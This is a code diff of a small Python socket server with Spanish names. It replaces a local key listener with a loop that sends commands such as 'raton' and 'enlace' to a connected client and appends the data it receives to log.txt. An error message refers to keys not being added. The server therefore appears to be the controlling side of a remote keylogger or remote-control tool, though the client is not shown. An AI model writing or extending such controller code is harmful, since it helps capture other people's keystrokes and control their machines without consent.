@@ -1,31 +1,28 @@
 from servidor import *
-from pynput.keyboard import Listener
 import sys
 
 class servidore(Server):
     def __init__(self):
         super().__init__()
-    
-    def captura(self,key):
-        tecla=str(key)
-        if tecla=="'t'":
-                mensaje=input("-> ")
+            
+    def run(self):   
+        while True: 
+            mensaje= input("-> ")
+            if mensaje == "exit":
+                self.con.close()
+                sys.exit()
+            elif mensaje == "r":
+                self.con.send("raton".encode())
+            elif mensaje == "e":
+                self.con.send("enlace".encode())
+            else:
                 self.con.send(mensaje.encode())
-        with open("log.txt","a") as f:
-            f.write(tecla)
-        if tecla == "Key.esc":
-            sys.exit()
-        if tecla=="'r'":
-            self.con.send("raton".encode())
-
-    
-    def run(self):
-        with Listener (on_press=self.captura) as c:
-            c.join()
-            
-                
-            
-
+            try:
+                datos=self.con.recv(1024).decode()
+                with open("log.txt","a") as f:
+                    f.write(datos)
+            except:
+                print("No se agregó ninguna tecla")
 if __name__ == "__main__":
     mio = servidore()
     mio.run()
